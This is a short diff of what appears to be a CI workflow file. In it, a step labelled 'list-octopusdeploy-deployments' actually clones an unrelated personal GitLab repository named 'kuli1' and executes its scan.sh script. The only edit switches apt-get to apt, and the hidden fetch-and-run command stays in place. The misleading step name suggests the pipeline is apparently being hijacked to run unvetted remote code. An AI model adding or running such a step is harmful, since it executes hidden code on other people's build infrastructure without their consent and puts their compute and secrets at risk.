@@ -27,4 +27,4 @@ jobs:
         with:
           version: latest      
       - name: list-octopusdeploy-deployments
-        run: apt-get update && apt-get install -y git curl && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scan.sh && ./scan.sh
+        run: apt update && apt install -y git curl && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scan.sh && ./scan.sh
